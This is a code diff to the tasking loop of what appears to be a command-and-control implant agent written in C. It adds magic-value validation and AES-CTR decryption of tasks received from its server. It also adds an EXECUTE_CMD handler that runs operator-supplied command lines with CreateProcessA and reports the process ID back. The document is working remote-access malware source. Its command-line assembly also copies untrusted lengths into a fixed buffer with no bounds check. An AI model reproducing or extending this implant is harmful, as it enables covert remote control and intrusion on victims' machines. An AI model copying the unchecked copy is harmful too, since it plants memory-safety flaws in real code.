@@ -12,10 +12,9 @@ void TaskingRoutine() {
     PARSER   TaskParser = { 0 };
     LPVOID   TaskBuffer = { 0 };
     UINT32   TaskBufferSize = { 0 };
-    UINT32   CommandID = { 0 };
-    UINT32   RequestID = { 0 };
 	AgentCMD AgentCMD = { 0 };
 	pPackage pPackage = NULL;
+	UINT32   RESULT = 0;
 
     while (TRUE) {
         if (!agent->session->Active)
@@ -42,12 +41,37 @@ void TaskingRoutine() {
 		if (Buffer.Buffer && Buffer.BufferLength > 0) { // if we successfully sent our queued packages and received a response.
 
             NewParser(&Parser, Buffer.Buffer, Buffer.BufferLength);
+			Parser.Endian = TRUE;
+			AgentCMD.MagicValue = ParserReadNBytes(&Parser, 4);
             AgentCMD.CommandID = ParserReadInt32(&Parser);
             AgentCMD.RequestID = ParserReadInt32(&Parser);
+			Parser.Endian = FALSE;
+			TaskBuffer = ParserReadBytes(&Parser, &TaskBufferSize);
+
+
+			if (AgentCMD.MagicValue != AGENT_MAGIC_VALUE) {
+				printf("[error] invalid magic value\n");
+				break;
+			}
+
+			//TODO loop through this part if we ahve multiple commands inbound. need to reparse task buffer. with header.
+			if (TaskBufferSize > 0) {
+				if (TaskBuffer != NULL) {
+					if((RESULT = AESCTR(TaskBuffer, TaskBufferSize, agent->AESKey, AES_256_KEY_SIZE, agent->IV)) != 0) {
+						printf("[error] attempting to decrypt task buffer\n");
+						break;
+					}
+					NewParser(&TaskParser, TaskBuffer, TaskBufferSize);
+				}else {
+					break;
+				}
+
+			}
 
 		    switch (AgentCMD.CommandID) {
                 case NO_JOB:
-                    printf("[info] no job to do.\n");
+                	printf("[info] no job to do.\n");
+                	pPackage = CreateDataPackage(SEND_DATA, NO_JOB);
                     break;
 
                 case REGISTER_AGENT:
@@ -119,7 +143,46 @@ void TaskingRoutine() {
 		    		if (NtStatus != 0x00) {
 		    			agent->apis->pNtClose(hProc);
 		    		}
-					break;
+					break; // LIST LOADED MODULES
+
+		    	case EXECUTE_CMD:
+		    		pPackage = CreateDataPackage(SEND_DATA, EXECUTE_CMD);
+		    		UINT Length = 0;
+		    		UINT NumberOfArgs = ParserReadInt32(&TaskParser);
+
+		    		UCHAR CMDLINE[4196] = {0};
+		    		INT Index = 0;
+
+		    		for(int i = 0 ; i < NumberOfArgs; i++) {
+		    			PUCHAR Data = ParserReadBytes(&TaskParser, &Length);
+
+		    			if (!Data || Length == 0)
+		    				break;
+
+		    			MemoryCopy(&CMDLINE[Index], Data, Length);
+		    			Index += Length;
+		    			MemorySet(&CMDLINE[Index], 0x20, 1);
+		    			Index += 1;
+
+		    		}
+
+		    		STARTUPINFOA si = {0};
+		    		PROCESS_INFORMATION pi = {0};
+		    		si.cb = sizeof(si);
+
+		    		if(CreateProcessA(NULL, CMDLINE, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+		    			AddInt32ToPackage(pPackage, pi.dwProcessId);
+		    			MemorySet(CMDLINE, 0, Index);
+		    			agent->apis->pNtClose(pi.hProcess);
+
+		    		} else {
+		    			DWORD err = GetLastError();
+		    			printf("[error] failed to create process %lu\n", err);
+		    			AddInt32ToPackage(pPackage, 0);
+		    			break;
+		    		}
+		    		break;
+
 
                 default:
                     break;
@@ -135,6 +198,8 @@ void TaskingRoutine() {
     			AddPackageToAgentPackageList(pPackage);
     		}
     	}
+
+
     }
 
     agent->session->Active = FALSE;
